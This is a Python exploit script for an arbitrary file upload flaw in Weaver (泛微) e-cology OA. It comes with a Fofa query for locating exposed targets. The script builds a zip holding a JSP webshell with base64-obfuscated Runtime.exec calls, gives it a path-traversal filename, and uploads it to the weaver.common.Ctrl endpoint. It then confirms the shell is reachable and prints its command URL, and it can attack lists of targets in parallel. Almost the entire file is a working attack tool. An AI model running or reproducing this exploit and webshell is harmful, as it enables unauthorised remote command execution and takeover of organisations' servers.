# -*- coding: utf-8 -*-
# 泛微OA weaver.common.Ctrl 任意文件上传
# Fofa:  app="泛微-协同办公OA"

import zipfile
import sys
import requests
import time
import multiprocessing
from rich.console import Console
from bs4 import BeautifulSoup 


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def file_zip(mm, webshell_name2):
    shell = """<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%
    if(request.getParameter("cmd")!=null){
        BASE64Decoder decoder = new BASE64Decoder();
        Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
        Process e = (Process)
                rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new
                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new
                        Object[]{}), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
    """  ## 替换shell内容
    zf = zipfile.ZipFile(mm + '.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)


def GetShell(urllist):
    mm = 'GyBtVQDJ'
    webshell_name1 = mm + '.jsp'
    webshell_name2 = '../../../' + webshell_name1

    file_zip(mm, webshell_name2)
    console.print(now_time() + " [INFO]     上传文件中#23333333333333", style='bold blue')
    urls = urllist + 'weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    file = [('file1', (mm + '.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
    try:
        requests.post(url=urls, files=file, timeout=10, verify=False)
        GetShellurl = urllist + 'cloudstore/' + webshell_name1
        GetShelllist = requests.get(url=GetShellurl, timeout=10, verify=False)
        if GetShelllist.status_code == 200:
            console.print(now_time() + "[SUCCESS]  利用成功webshell地址为: "+ GetShellurl+'?cmd=', style='bold green')
            return 'ok'
        else:
            console.print(now_time() + " [WARNING]  不存在Weaver_Common_Ctrl_Upload漏洞", style='bold red')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    console.print(now_time() + " [INFO]     正在检测Weaver_Common_Ctrl_Upload漏洞", style='bold blue')
    GetShell(target_url)


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')